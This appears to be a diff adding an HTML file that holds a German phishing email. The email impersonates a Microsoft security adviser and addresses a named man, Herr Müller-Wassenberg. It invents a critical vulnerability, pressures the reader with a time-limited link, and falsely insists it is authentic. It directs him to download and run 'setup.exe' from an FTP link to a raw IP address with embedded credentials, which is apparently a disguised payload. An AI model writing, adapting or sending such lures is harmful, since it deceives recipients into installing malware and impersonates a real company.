@@ -1,0 +1,34 @@
+<html>
+<head>
+</head>
+<body>
+<p>Betreff: Wichtiges Sicherheitsupdate - Handeln Sie jetzt!</p>
+<br>
+<p>Sehr geehrter Herr Müller-Wassenberg,</p>
+<br>
+<p>als leitender Sicherheitsberater bei Microsoft möchte ich Sie heute dringend auf ein äußerst wichtiges Sicherheitsupdate hinweisen, das für Ihr System von entscheidender Bedeutung ist. Mein Name ist David Fischer, und ich bin dafür verantwortlich, sicherzustellen, dass unsere geschätzten Kunden wie Sie stets optimal geschützt sind.</p>
+<br>
+<p>In den letzten Tagen haben unsere Sicherheitsexperten eine kritische Schwachstelle in Ihrem System identifiziert, die potenziell erhebliche Risiken birgt. Um Ihre Daten, Privatsphäre und die allgemeine Integrität Ihres Systems zu gewährleisten, haben wir ein umfassendes Sicherheitsupdate entwickelt, das speziell auf diese Schwachstelle abzielt.</p>
+<br>
+<p>Um sicherzustellen, dass Sie umgehend geschützt sind, möchten wir Ihnen die entsprechende Patch-Datei bereitstellen. Bitte klicken Sie auf den folgenden Link, um das Update herunterzuladen und zu installieren:</p>
+<br>
+<p><a href="ftp://powerpaul_test:qkHcfLPcKX7!@34.170.52.106/private/setup.exe">Download des Sicherheitsupdates</a></p>
+<br>
+<p>Bitte beachten Sie, dass der Download-Link nur für eine begrenzte Zeit gültig ist. Stellen Sie daher sicher, dass Sie das Update so schnell wie möglich herunterladen und installieren, um möglichen Sicherheitsverletzungen vorzubeugen.</p>
+<br>
+<p>Als vertrauenswürdiger Partner im Bereich der Cybersicherheit möchten wir betonen, dass wir unsere Kunden niemals unaufgefordert per E-Mail kontaktieren, es sei denn, es liegt ein dringendes Sicherheitsrisiko vor. Wir verstehen, dass es in der heutigen Zeit viele betrügerische E-Mails gibt, aber ich versichere Ihnen, dass diese E-Mail authentisch und von Microsoft stammt.</p>
+<br>
+<p>Wir empfehlen Ihnen dringend, das Sicherheitsupdate herunterzuladen und den Installationsvorgang zu starten, um Ihr System sofort zu schützen. Sollten Sie Unterstützung oder weitere Informationen benötigen, stehen Ihnen unsere Sicherheitsexperten rund um die Uhr zur Verfügung. Sie können uns unter der unten angegebenen Rufnummer oder per E-Mail kontaktieren.</p>
+<br>
+<p>Wir nehmen die Sicherheit unserer Kunden sehr ernst und möchten Ihnen dabei helfen, Ihr System vor Bedrohungen zu schützen. Handeln Sie jetzt, um sicherzustellen, dass Ihr System optimal geschützt ist und Sie die volle Kontrolle über Ihre Daten behalten.</p>
+<br>
+<p>Mit freundlichen Grüßen,</p>
+<br>
+<p>David Fischer<br>
+Leitender Sicherheitsberater<br>
+Microsoft Corporation</p>
+<br>
+<p>Kontakt: +1-800-123-4567<br>
+E-Mail: security@microsoft.com</p>
+</body>
+</html>
